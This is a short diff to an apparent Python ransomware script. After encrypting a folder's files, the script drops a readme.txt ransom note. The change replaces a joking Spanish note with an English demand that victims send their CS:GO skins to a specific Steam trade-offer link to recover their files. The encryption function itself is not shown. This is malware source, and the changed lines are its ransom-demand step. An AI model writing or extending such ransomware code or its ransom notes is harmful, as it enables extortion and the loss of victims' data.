@@ -30,7 +30,8 @@ if __name__ == '__main__':
     encrypt(full_path, key)
 
     with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
-        file.write('Ficheros encriptados por el tito Errodringer\n')
-        file.write('Dame una suscripcion para desencriptar. Thanks')
+        file.write('All your files AHve Been Encrypted!\n')
+        file.write('To recover it send all ur csgo skins here!')
+        file.write('https://steamcommunity.com/tradeoffer/new/?partner=378784217&token=S_IxULHf')
 
 
